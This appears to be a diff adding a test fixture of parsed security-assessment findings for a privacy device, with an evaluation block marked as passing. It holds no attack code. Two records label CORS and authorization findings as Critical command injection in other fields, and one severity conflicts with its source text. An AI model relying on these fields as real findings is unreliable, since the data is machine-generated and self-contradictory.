+      "impact": "Potential impact includes exploitation, unauthorized access, data exposure, or service compromise against investigation-scope if this issue remains unaddressed.",
+      "evidence": "Warnings: Finding generated from bounded report catalog; review detailed body before training",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:30:55.039Z",
+          "status": "Open",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Finding generated from bounded report catalog; review detailed body before training"
+        }
+      ],
+      "reported": {
+        "title": "COMMAND INJECTION",
+        "severity": "Critical",
+        "asset": "investigation-scope",
+        "status": "Open",
+        "summary": "COMMAND INJECTION affecting investigation-scope; extractor found type Command Injection. Warning: Finding generated from bounded report catalog; review detailed body before training",
+        "impact": "Potential impact includes exploitation, unauthorized access, data exposure, or service compromise against investigation-scope if this issue remains unaddressed.",
+        "evidence": "Warnings: Finding generated from bounded report catalog; review detailed body before training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "command injection",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "BF-WP-001|command injection|investigation scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 75,
+        "sourceSectionTitle": "Command Injection",
+        "sourceText": "BF-WP-001 Command Injection Critical",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Command Injection",
+      "canonicalKey": "BF-WP-001|command injection|investigation scope||||||"
+    },
+    {
+      "id": "F-bishop-002",
+      "slug": "cross-site-request-forgery-csrf-investigation-scope",
+      "reportId": "G-bishop-fox-winston-privacy-assessment",
+      "reportName": "bishop-fox-winston-privacy-assessment",
+      "title": "Cross-Site Request Forgery (CSRF)",
+      "cve": "—",
+      "severity": "High",
+      "asset": "investigation-scope",
+      "score": 84,
+      "status": "Open",
+      "detectedAt": "2026-06-05T23:30:47.397Z",
+      "summary": "CROSS-SITE REQUEST FORGERY (CSRF affecting investigation-scope; extractor found type Cross-Site Request Forgery. Warning: Finding generated from bounded report catalog; review detailed body before training",
+      "impact": "Potential impact includes exploitation, unauthorized access, data exposure, or service compromise against investigation-scope if this issue remains unaddressed.",
+      "evidence": "Warnings: Finding generated from bounded report catalog; review detailed body before training",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:30:55.039Z",
+          "status": "Open",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Finding generated from bounded report catalog; review detailed body before training"
+        }
+      ],
+      "reported": {
+        "title": "CROSS-SITE REQUEST FORGERY (CSRF",
+        "severity": "High",
+        "asset": "investigation-scope",
+        "status": "Open",
+        "summary": "CROSS-SITE REQUEST FORGERY (CSRF affecting investigation-scope; extractor found type Cross-Site Request Forgery. Warning: Finding generated from bounded report catalog; review detailed body before training",
+        "impact": "Potential impact includes exploitation, unauthorized access, data exposure, or service compromise against investigation-scope if this issue remains unaddressed.",
+        "evidence": "Warnings: Finding generated from bounded report catalog; review detailed body before training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "cross-site request forgery (csrf",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "BF-WP-002|cross site request forgery csrf|investigation scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 75,
+        "sourceSectionTitle": "Cross-Site Request Forgery (CSRF)",
+        "sourceText": "BF-WP-002 Cross-Site Request Forgery (CSRF) High",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Cross-Site Request Forgery (CSRF)",
+      "canonicalKey": "BF-WP-002|cross site request forgery csrf|investigation scope||||||"
+    },
+    {
+      "id": "F-bishop-003",
+      "slug": "improper-access-controls-investigation-scope",
+      "reportId": "G-bishop-fox-winston-privacy-assessment",
+      "reportName": "bishop-fox-winston-privacy-assessment",
+      "title": "Improper Access Controls",
+      "cve": "—",
+      "severity": "High",
+      "asset": "investigation-scope",
+      "score": 84,
+      "status": "Open",
+      "detectedAt": "2026-06-05T23:30:47.397Z",
+      "summary": "IMPROPER ACCESS CONTROLS affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+      "impact": "Potential impact includes exploitation, unauthorized access, data exposure, or service compromise against investigation-scope if this issue remains unaddressed.",
+      "evidence": "Warnings: Finding generated from bounded report catalog; review detailed body before training",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:30:55.040Z",
+          "status": "Open",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Finding generated from bounded report catalog; review detailed body before training"
+        }
+      ],
+      "reported": {
+        "title": "IMPROPER ACCESS CONTROLS",
+        "severity": "High",
+        "asset": "investigation-scope",
+        "status": "Open",
+        "summary": "IMPROPER ACCESS CONTROLS affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+        "impact": "Potential impact includes exploitation, unauthorized access, data exposure, or service compromise against investigation-scope if this issue remains unaddressed.",
+        "evidence": "Warnings: Finding generated from bounded report catalog; review detailed body before training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "improper access controls",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "BF-WP-003|improper access controls|investigation scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 75,
+        "sourceSectionTitle": "Improper Access Controls",
+        "sourceText": "BF-WP-003 Improper Access Controls High",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Improper Access Controls",
+      "canonicalKey": "BF-WP-003|improper access controls|investigation scope||||||"
+    },
+    {
+      "id": "F-G-bishop-fox-winston-privacy-assessment-GIDX-004",
+      "slug": "command-injection-investigation-scope",
+      "reportId": "G-bishop-fox-winston-privacy-assessment",
+      "reportName": "bishop-fox-winston-privacy-assessment",
+      "title": "Insecure Cross-Origin Resource Sharing (CORS)",
+      "cve": "—",
+      "severity": "High",
+      "asset": "investigation-scope",
+      "score": 84,
+      "status": "Open",
+      "detectedAt": "2026-06-05T23:30:47.397Z",
+      "summary": "Insecure Cross-Origin Resource Sharing (CORS) affecting investigation-scope; finding recovered from the official report index and requires review.",
+      "impact": "Potential impact includes exploitation, unauthorized access, data exposure, or service compromise against investigation-scope if this issue remains unaddressed.",
+      "evidence": "Warnings: Finding generated from bounded report catalog; review detailed body before training",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:30:55.039Z",
+          "status": "Open",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Finding generated from bounded report catalog; review detailed body before training"
+        }
+      ],
+      "reported": {
+        "title": "COMMAND INJECTION",
+        "severity": "Critical",
+        "asset": "investigation-scope",
+        "status": "Open",
+        "summary": "COMMAND INJECTION affecting investigation-scope; extractor found type Command Injection. Warning: Finding generated from bounded report catalog; review detailed body before training",
+        "impact": "Potential impact includes exploitation, unauthorized access, data exposure, or service compromise against investigation-scope if this issue remains unaddressed.",
+        "evidence": "Warnings: Finding generated from bounded report catalog; review detailed body before training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "command injection",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "BF-WP-004|insecure cross origin resource sharing cors|investigation scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 75,
+        "sourceSectionTitle": "Insecure Cross-Origin Resource Sharing (CORS)",
+        "sourceText": "BF-WP-004 Insecure Cross-Origin Resource Sharing (CORS) High",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        },
+        "method": "generic-official-index-recovery"
+      },
+      "method": "generic-official-index-recovery",
+      "sourceSectionTitle": "Insecure Cross-Origin Resource Sharing (CORS)",
+      "canonicalKey": "BF-WP-004|insecure cross origin resource sharing cors|investigation scope||||||"
+    },
+    {
+      "id": "F-G-bishop-fox-winston-privacy-assessment-GIDX-005",
+      "slug": "command-injection-investigation-scope",
+      "reportId": "G-bishop-fox-winston-privacy-assessment",
+      "reportName": "bishop-fox-winston-privacy-assessment",
+      "title": "Insufficient Authorization Controls",
+      "cve": "—",
+      "severity": "High",
+      "asset": "investigation-scope",
+      "score": 84,
+      "status": "Open",
+      "detectedAt": "2026-06-05T23:30:47.397Z",
+      "summary": "Insufficient Authorization Controls affecting investigation-scope; finding recovered from the official report index and requires review.",
+      "impact": "Potential impact includes exploitation, unauthorized access, data exposure, or service compromise against investigation-scope if this issue remains unaddressed.",
+      "evidence": "Warnings: Finding generated from bounded report catalog; review detailed body before training",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:30:55.039Z",
+          "status": "Open",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Finding generated from bounded report catalog; review detailed body before training"
+        }
+      ],
+      "reported": {
+        "title": "COMMAND INJECTION",
+        "severity": "Critical",
+        "asset": "investigation-scope",
+        "status": "Open",
+        "summary": "COMMAND INJECTION affecting investigation-scope; extractor found type Command Injection. Warning: Finding generated from bounded report catalog; review detailed body before training",
+        "impact": "Potential impact includes exploitation, unauthorized access, data exposure, or service compromise against investigation-scope if this issue remains unaddressed.",
+        "evidence": "Warnings: Finding generated from bounded report catalog; review detailed body before training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "command injection",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "BF-WP-005|insufficient authorization controls|investigation scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 75,
+        "sourceSectionTitle": "Insufficient Authorization Controls",
+        "sourceText": "BF-WP-005 Insufficient Authorization Controls High",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        },
+        "method": "generic-official-index-recovery"
+      },
+      "method": "generic-official-index-recovery",
+      "sourceSectionTitle": "Insufficient Authorization Controls",
+      "canonicalKey": "BF-WP-005|insufficient authorization controls|investigation scope||||||"
+    },
+    {
+      "id": "F-bishop-005",
+      "slug": "default-credentials-investigation-scope",
+      "reportId": "G-bishop-fox-winston-privacy-assessment",
+      "reportName": "bishop-fox-winston-privacy-assessment",
+      "title": "Default Credentials",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "investigation-scope",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:30:47.397Z",
+      "summary": "DEFAULT CREDENTIALS affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Warnings: Finding generated from bounded report catalog; review detailed body before training",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:30:55.040Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Finding generated from bounded report catalog; review detailed body before training"
+        }
+      ],
+      "reported": {
+        "title": "DEFAULT CREDENTIALS",
+        "severity": "Medium",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "DEFAULT CREDENTIALS affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Warnings: Finding generated from bounded report catalog; review detailed body before training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "default credentials",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "BF-WP-006|default credentials|investigation scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 75,
+        "sourceSectionTitle": "Default Credentials",
+        "sourceText": "BF-WP-006 Default Credentials Medium",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Default Credentials",
+      "canonicalKey": "BF-WP-006|default credentials|investigation scope||||||"
+    },
+    {
+      "id": "F-bishop-006",
+      "slug": "undocumented-ssh-service-investigation-scope",
+      "reportId": "G-bishop-fox-winston-privacy-assessment",
+      "reportName": "bishop-fox-winston-privacy-assessment",
+      "title": "Undocumented SSH Service",
+      "cve": "—",
+      "severity": "Low",
+      "asset": "investigation-scope",
+      "score": 35,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:30:47.397Z",
+      "summary": "UNDOCUMENTED SSH SERVICE affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Warnings: Finding generated from bounded report catalog; review detailed body before training",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:30:55.041Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Finding generated from bounded report catalog; review detailed body before training"
+        }
+      ],
+      "reported": {
+        "title": "UNDOCUMENTED SSH SERVICE",
+        "severity": "Low",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "UNDOCUMENTED SSH SERVICE affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Warnings: Finding generated from bounded report catalog; review detailed body before training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "undocumented ssh service",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "BF-WP-007|undocumented ssh service|investigation scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 75,
+        "sourceSectionTitle": "Undocumented SSH Service",
+        "sourceText": "BF-WP-007 Undocumented SSH Service Informational",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Undocumented SSH Service",
+      "canonicalKey": "BF-WP-007|undocumented ssh service|investigation scope||||||"
+    }
+  ],
+  "eval": {
+    "enableNlp": true,
+    "expectedCount": 7,
+    "actualCount": 7,
+    "expectedSeverityCounts": {
+      "Critical": 1,
+      "High": 4,
+      "Medium": 1,
+      "Low": 1
+    },
+    "actualSeverityCounts": {
+      "Critical": 1,
+      "High": 4,
+      "Medium": 1,
+      "Low": 1
+    },
+    "duplicates": 0,
+    "negativeHits": 0,
+    "pass": true
+  }
+}
